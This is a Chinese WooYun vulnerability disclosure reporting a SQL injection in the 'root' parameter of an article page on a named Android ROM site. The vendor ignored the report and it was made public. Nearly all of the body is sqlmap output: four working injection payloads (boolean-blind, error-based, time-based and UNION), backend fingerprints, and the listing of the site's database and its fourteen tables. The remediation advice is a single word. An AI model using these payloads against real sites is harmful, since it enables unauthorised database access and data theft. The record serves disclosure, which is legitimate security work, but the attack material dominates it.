wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-11-21：	细节已通知厂商并且等待厂商处理中									2015-11-26：	厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  
http://lidroid.com/article?id=127&root=125
rootGET parameter 'root' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection point(s) with a total of 60 HTTP(s) requests:---Parameter: root (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=128&root=125 AND 5909=5909    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: id=128&root=125 AND (SELECT 2453 FROM(SELECT COUNT(*),CONCAT(0x7176767171,(SELECT (ELT(2453=2453,1))),0x716a6a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: id=128&root=125 AND (SELECT * FROM (SELECT(SLEEP(5)))wYHU)    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: id=128&root=125 UNION ALL SELECT NULL,NULL,CONCAT(0x7176767171,0x5651556f4f4b784d4e6453656f4c4d6d4671644c447a42616c4e7471756f676a6d446c7452416a4c,0x716a6a7171),NULL,NULL,NULL,NULL-- ----[19:52:11] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.4.44, Nginxback-end DBMS: MySQL 5.0   漏洞证明：  available databases [2]:[*] information_schema[*] wwwDatabase: www[14 tables]+---------------------------------------+| app                                   || app_category                          || app_download_history                  || article                               || brand                                 || device                                || driver                                || navigation                            || ota_package                           || ota_rom                               || rom_download_url                      || rom_info                              || rom_screenshot                        || ui_type                               |+---------------------------------------+   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-26 15:04 厂商回复：  漏洞Rank：2  (WooYun评价) 最新状态： 暂无
